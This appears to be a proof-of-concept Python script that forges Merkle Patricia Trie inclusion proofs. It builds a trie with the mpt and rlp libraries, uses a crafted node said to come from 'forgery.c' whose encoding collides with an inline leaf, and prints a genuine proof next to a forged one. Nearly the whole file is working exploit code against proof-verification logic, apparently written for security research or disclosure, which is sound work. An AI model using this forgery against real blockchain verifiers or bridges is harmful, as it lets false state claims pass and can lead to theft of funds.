import mpt
import rlp
import itertools
from mpt.hash import keccak_hash

# Output of forgery.c
leaf = rlp.decode(bytes.fromhex("df209d000000000000000000000000000000000000000000516b758b00000000"))
value = leaf[1]

proof_node = rlp.decode(keccak_hash(rlp.encode([b'\x20', bytes(value)]))[:-1])
assert(len(rlp.encode(proof_node)) == 31)

storage = {}
t = mpt.MerklePatriciaTrie(storage)

t.update(bytes([0]*32), value)
t.update(bytes([0]*31+[1]), b'foobar')


root = t.root_hash()
print("Root hash: ", root.hex())
root_node = rlp.decode(t._storage[root])
#print("Root node: ", root_node)
branch_node = rlp.decode(t._storage[root_node[1]])
#print("Branch node: ", branch_node)
assert branch_node[0] == rlp.encode(proof_node) + bytes([0])
leaf_node = rlp.decode(t._storage[branch_node[0]])
#print("Leaf node: ", leaf_node)


genuine_proof = rlp.encode(list(map(rlp.encode, [root_node, branch_node, leaf_node])))

print("Genuine Proof: ", genuine_proof.hex())

forged_proof = rlp.encode([rlp.encode(root_node), rlp.encode(branch_node), rlp.encode(proof_node)])

print("Forged proof: ", forged_proof.hex())